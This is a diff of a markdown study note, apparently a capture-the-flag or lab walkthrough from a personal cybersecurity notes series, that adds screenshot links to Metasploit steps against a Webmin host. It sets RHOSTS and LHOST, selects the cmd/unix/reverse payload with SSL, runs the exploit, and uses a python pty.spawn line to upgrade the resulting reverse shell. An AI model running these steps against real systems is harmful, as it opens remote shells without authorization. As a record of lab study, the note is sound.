@@ -82,20 +82,14 @@ search Webmin
 use 7
 show options
 ```
-![]()
+![](https://github.com/Heartking-2324/Cybersecurity-90days_notes/blob/main/Day-09/use7-show-option.png?raw=true)
 ```
 set RHOSTS 10.10.180.246
-```
-```
 set LHOST 10.17.88.92
-```
-```
 set LPORT 5566
-```
-```
 show options
 ```
-![]()
+![](https://github.com/Heartking-2324/Cybersecurity-90days_notes/blob/main/Day-09/Rhosts.png?raw=true)
 
 Now after all the above the things do these final things one after anothers 
 ```
@@ -106,11 +100,11 @@ set payload cmd/unix/reverse
 set SSL true
 show options 
 ```
-![]()
+![](https://github.com/Heartking-2324/Cybersecurity-90days_notes/blob/main/Day-09/SSL%20true.png?raw=true)
 
 After all above things now just put this command and then hit enter.
 ``` exploit ```
-![]()
+![](https://github.com/Heartking-2324/Cybersecurity-90days_notes/blob/main/Day-09/exploit.png?raw=true)
 After this enter the following commands 
 ```
 python -c 'import pty; pty.spawn("/bin/bash")'
